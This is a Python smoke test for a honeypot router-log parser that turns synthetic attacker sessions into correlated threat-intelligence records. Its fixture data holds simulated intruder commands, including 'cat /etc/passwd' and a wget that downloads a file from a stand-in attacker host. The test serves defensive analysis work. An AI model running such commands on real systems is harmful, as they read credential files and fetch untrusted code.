"""Smoke test for the router parser (migrated from its old
`if __name__` block so CI runs it). Generic parse/correlate/
has_substance/STIX contract is covered in test_parsers.py."""
from __future__ import annotations

import tpot2cti.parsers.router as _m
globals().update({k: v for k, v in vars(_m).items() if not k.startswith('__')})


def test_router_smoke():
    from datetime import datetime, timedelta, timezone

    logging.basicConfig(level=logging.INFO, format="%(levelname)s %(message)s")

    parser = RouterParser()
    now = datetime.now(timezone.utc)

    # ── Case 1: drive-by — connect with NO commands ───────────────────
    driveby_doc = {
        "@timestamp": now.isoformat(),
        "type": "Router",
        "src_ip": "203.0.113.60",
        "src_port": 51200,
        "dst_port": 23,
        "t-pot_hostname": "node1",
        "session": "rsess-empty",
        "commands": [],
        "geoip": {"country_iso_code": "US", "asn": 64500},
    }

    # ── Case 2: substantive — single doc with a list of commands ──────
    list_doc = {
        "@timestamp": now.isoformat(),
        "type": "Router",
        "src_ip": "198.51.100.80",
        "src_port": 51201,
        "dst_port": 23,
        "t-pot_hostname": "node1",
        "session": "rsess-list-A",
        "commands": [
            "enable",
            "cat /etc/passwd",
            "wget http://evil.example.com/x -O /tmp/x",
        ],
        "geoip": {"country_iso_code": "CN", "asn": 4134},
    }

    # ── Case 3: substantive — per-command docs sharing a session_id ──
    base = {
        "type": "Router",
        "src_ip": "198.51.100.81",
        "src_port": 51202,
        "dst_port": 23,
        "t-pot_hostname": "node1",
        "session": "rsess-multi-B",
    }
    per_cmd_docs = [
        {**base,
         "@timestamp": now.isoformat(),
         "command": "enable"},
        {**base,
         "@timestamp": (now + timedelta(seconds=2)).isoformat(),
         "command": "ls -la"},
        {**base,
         "@timestamp": (now + timedelta(seconds=5)).isoformat(),
         "command": "uname -a"},
    ]

    # ── Case 4: substantive — no session_id, window-correlated burst ──
    base_nosid = {
        "type": "Router",
        "src_ip": "198.51.100.82",
        "dst_port": 23,
        "t-pot_hostname": "node1",
    }
    nosid_docs = [
        {**base_nosid, "@timestamp": now.isoformat(),
         "command": "id"},
        {**base_nosid,
         "@timestamp": (now + timedelta(seconds=30)).isoformat(),
         "command": "whoami"},
    ]

    drive_event = parser.parse(driveby_doc)
    list_event = parser.parse(list_doc)
    per_events = [parser.parse(d) for d in per_cmd_docs]
    nosid_events = [parser.parse(d) for d in nosid_docs]
    assert drive_event is not None
    assert list_event is not None
    assert all(e is not None for e in per_events)
    assert all(e is not None for e in nosid_events)

    drive_sessions = parser.correlate([drive_event])
    list_sessions = parser.correlate([list_event])
    per_sessions = parser.correlate(per_events)
    nosid_sessions = parser.correlate(nosid_events)

    assert len(drive_sessions) == 1
    assert len(list_sessions) == 1
    assert len(per_sessions) == 1, (
        f"per-cmd docs must fold into 1 session, got {len(per_sessions)}"
    )
    assert len(nosid_sessions) == 1, (
        f"no-sid burst must fold into 1 session via window correlator, "
        f"got {len(nosid_sessions)}"
    )

    drive_s = drive_sessions[0]
    list_s = list_sessions[0]
    per_s = per_sessions[0]
    nosid_s = nosid_sessions[0]

    assert parser.has_substance(drive_s) is False, "empty-cmds must be drive-by"
    assert parser.has_substance(list_s) is True, "command list must be substantive"
    assert parser.has_substance(per_s) is True, "per-cmd docs must be substantive"
    assert parser.has_substance(nosid_s) is True, "windowed burst must be substantive"

    # Aggregator: commands populated in order
    assert list_s.commands == [
        "enable",
        "cat /etc/passwd",
        "wget http://evil.example.com/x -O /tmp/x",
    ]
    assert per_s.commands == ["enable", "ls -la", "uname -a"]
    assert nosid_s.commands == ["id", "whoami"]

    # dst_ports populated
    assert 23 in list_s.dst_ports

    print("OK")
